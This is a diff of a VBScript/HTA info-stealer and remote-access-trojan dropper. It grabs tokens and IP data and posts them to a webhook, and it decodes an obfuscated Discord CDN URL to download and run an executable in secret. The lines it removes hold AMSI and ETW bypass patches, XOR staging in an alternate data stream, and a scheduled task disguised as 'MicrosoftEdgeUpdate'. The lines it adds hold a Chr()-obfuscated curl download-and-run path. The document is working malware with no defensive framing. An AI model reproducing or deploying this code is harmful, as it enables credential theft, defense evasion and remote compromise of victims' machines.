@@ -20,10 +20,6 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
-' --- Evasion pre-patch: AMSI + ETW ---
-Call PatchAMSI
-Call PatchETW
-
 ' --- Initial Grab (logs -> WH) ---
 Call GrabTokens(WH)
 Call IP(WH)
@@ -51,161 +47,35 @@ Next
 
 window.close()
 
-' --- AMSI PATCH ---
-Sub PatchAMSI()
-    Dim ps
-    ps = "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'};" & _
-         "$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like '*Context'};" & _
-         "[Runtime.InteropServices.Marshal]::WriteInt32($b.GetValue($null),0x41414141)"
-    Dim psf : psf = TmpFile("a.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-End Sub
-
-' --- ETW PATCH ---
-Sub PatchETW()
-    Dim ps
-    ps = "$p=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');" & _
-         "$f=$p.GetField('etwProvider','NonPublic,Static');" & _
-         "if($f){$f.SetValue($null,$null)}"
-    Dim psf : psf = TmpFile("e.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-End Sub
-
-' --- DropRAT: ADS stage + XOR + buffer + schtask parent swap ---
+' --- DropRAT (old source flow, logs -> WH) ---
 Sub DropRAT(targetWH)
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
 
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
-    Dim host : host = tPath & "\cache.dat"
-    Dim ads  : ads  = host & ":x"
 
     If fso.FileExists(op) Then fso.DeleteFile op
-    If fso.FileExists(host) Then fso.DeleteFile host
-    WriteFile host, Chr(0)
 
-    Dim body : body = HttpGetBytes(dl)
-    If LenB(body) < 3000000 Then
-        Call PostEmbedTo(":hourglass: RAT", "Short download: " & CStr(LenB(body)), 16711680, targetWH)
-        Exit Sub
-    End If
+    Dim cCmd : cCmd = Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&" -s -L -o """ & op & """ """ & dl & """"
+    Dim runExec : runExec = Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32) & cCmd
+    sh.Run runExec, 0, True
 
-    ' XOR and stage to ADS
-    Dim xored : xored = XorBytes(body)
-    WriteBinary ads, xored
-
-    ' Read back, decode, write to .exe
-    Dim readBack : readBack = ReadBinary(ads)
-    Dim decoded : decoded = XorBytes(readBack)
-    WriteBinary op, decoded
-    fso.DeleteFile host, True
-
+    Dim rDone : rDone = False
     If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 3000000 Then
-            Dim dsize : dsize = fso.GetFile(op).Size
-            Call PostEmbedTo(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " | Launching...", 3447003, targetWH)
-            Dim tn : tn = "MicrosoftEdgeUpdate" & CStr(Int(Rnd * 9000) + 1000)
-            sh.Run "cmd /c schtasks /create /tn """ & tn & """ /tr """ & op & """ /sc once /st 00:00 /f /rl highest > nul 2>&1", 0, True
-            sh.Run "cmd /c schtasks /run /tn """ & tn & """ > nul 2>&1", 0, True
-            sh.Run "cmd /c schtasks /delete /tn """ & tn & """ /f > nul 2>&1", 0, False
-            Call RunCmd("""" & op & """")
-            Call PostEmbedTo(":white_check_mark: RAT", "Payload executed", 65280, targetWH)
-            Exit Sub
-        End If
+        If fso.GetFile(op).Size > 3000000 Then rDone = True
     End If
-    Call PostEmbedTo(":hourglass: RAT Timeout", "Retrying...", 16711680, targetWH)
+
+    If rDone Then
+        Dim dsize : dsize = fso.GetFile(op).Size
+        Call PostEmbedTo(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 3447003, targetWH)
+        Call RunCmd(op)
+        Call PostEmbedTo(":white_check_mark: RAT", "Payload executed successfully", 65280, targetWH)
+    Else
+        sh.Run "cmd /c taskkill /f /im " & Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101) & " > nul 2>&1", 0, False
+        Call PostEmbedTo(":hourglass: RAT Timeout", "Download failed or incomplete. Retrying...", 16711680, targetWH)
+    End If
 End Sub
-
-' --- HttpGetBytes ---
-Function HttpGetBytes(url)
-    HttpGetBytes = ""
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.SetOption 3, 13056
-    xh.Open "GET", url, False
-    xh.Send
-    If xh.Status <> 200 Then Exit Function
-    HttpGetBytes = xh.responseBody
-    Set xh = Nothing
-End Function
-
-' --- XorBytes: XOR with 0x5A ---
-Function XorBytes(data)
-    Dim stmIn : Set stmIn = CreateObject("ADODB.Stream")
-    stmIn.Type = 1
-    stmIn.Open
-    stmIn.Write data
-    stmIn.Position = 0
-    Dim stmOut : Set stmOut = CreateObject("ADODB.Stream")
-    stmOut.Type = 1
-    stmOut.Open
-    Dim chunk : chunk = 65536
-    Do While stmIn.Position < stmIn.Size
-        Dim buf : buf = stmIn.Read(chunk)
-        Dim arr : arr = StrToBytes(buf)
-        Dim i
-        For i = 0 To UBound(arr)
-            arr(i) = arr(i) Xor 90
-        Next
-        stmOut.Write BytesToStr(arr)
-    Loop
-    stmOut.Position = 0
-    XorBytes = stmOut.Read
-    stmIn.Close : stmOut.Close
-    Set stmIn = Nothing : Set stmOut = Nothing
-End Function
-
-Function StrToBytes(s)
-    Dim stm : Set stm = CreateObject("ADODB.Stream")
-    stm.Type = 1
-    stm.Open
-    stm.Write s
-    stm.Position = 0
-    Dim out : out = stm.Read
-    stm.Close
-    Set stm = Nothing
-    Dim arr() : ReDim arr(LenB(out) - 1)
-    Dim i
-    For i = 1 To LenB(out)
-        arr(i-1) = AscB(MidB(out, i, 1))
-    Next
-    StrToBytes = arr
-End Function
-
-Function BytesToStr(arr)
-    Dim out, i
-    out = ""
-    For i = 0 To UBound(arr)
-        out = out & ChrB(arr(i))
-    Next
-    BytesToStr = out
-End Function
-
-Sub WriteBinary(path, data)
-    Dim stm : Set stm = CreateObject("ADODB.Stream")
-    stm.Type = 1
-    stm.Open
-    stm.Write data
-    stm.SaveToFile path, 2
-    stm.Close
-    Set stm = Nothing
-End Sub
-
-Function ReadBinary(path)
-    ReadBinary = ""
-    Dim stm : Set stm = CreateObject("ADODB.Stream")
-    stm.Type = 1
-    stm.Open
-    stm.LoadFromFile path
-    ReadBinary = stm.Read
-    stm.Close
-    Set stm = Nothing
-End Function
 
 ' --- IP ---
 Sub IP(targetWH)
@@ -406,6 +276,7 @@ Function Stream_BinaryToString(Binary)
     Stream.Close
 End Function
 
+' --- PostEmbedTo (single target, used everywhere) ---
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
